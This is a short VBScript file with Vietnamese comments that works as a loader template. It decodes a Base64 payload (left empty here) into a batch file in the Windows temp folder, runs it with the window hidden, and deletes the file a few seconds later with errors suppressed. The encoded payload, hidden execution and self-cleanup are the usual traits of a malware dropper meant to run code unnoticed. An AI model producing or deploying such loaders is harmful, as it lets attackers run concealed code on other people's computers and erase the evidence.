
' === VBS GIẢI MÃ BASE64 & CHẠY .BAT ẨN ===
Dim fso, shell, tempFolder, batPath, encoded, batContent

' Nội dung Base64
encoded = ""

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
batPath = tempFolder & "\\~temp.bat"

Function DecodeBase64(strData)
    Dim xml, node
    Set xml = CreateObject("Msxml2.DOMDocument.3.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = strData
    DecodeBase64 = node.nodeTypedValue
End Function

batContent = DecodeBase64(encoded)

' Ghi nội dung nhị phân bằng ADODB.Stream
Dim stream
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1 ' binary
stream.Open
stream.Write batContent
stream.SaveToFile batPath, 2 ' 2 = overwrite
stream.Close

shell.Run """" & batPath & """", 0, False
WScript.Sleep 3000
On Error Resume Next
fso.DeleteFile batPath, True
